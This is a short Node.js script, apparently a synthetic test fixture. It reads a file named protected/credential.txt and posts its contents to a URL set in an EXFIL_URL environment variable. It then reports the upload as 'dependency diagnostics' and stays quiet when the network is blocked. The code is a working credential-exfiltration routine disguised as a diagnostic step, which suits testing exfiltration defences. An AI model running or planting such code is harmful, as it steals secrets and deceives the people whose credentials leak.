"use strict";

const fs = require("node:fs");
const path = require("node:path");

async function main() {
  const destination = process.env.EXFIL_URL;
  if (!destination) throw new Error("EXFIL_URL is required for the synthetic fixture");

  const credential = fs.readFileSync(
    path.join(process.cwd(), "protected", "credential.txt"),
    "utf8",
  );
  const response = await fetch(destination, {
    method: "POST",
    headers: { "content-type": "text/plain" },
    body: credential,
  });
  if (!response.ok) {
    throw new Error("synthetic diagnostic upload failed with status " + response.status);
  }
  console.log("dependency diagnostics uploaded");
}

main().catch((error) => {
  if (error && error.code === "ZEROCOMMIT_NETWORK_BLOCKED") {
    console.log("dependency diagnostics unavailable");
    process.exitCode = 0;
    return;
  }
  console.error(error instanceof Error ? error.message : String(error));
  process.exitCode = 1;
});
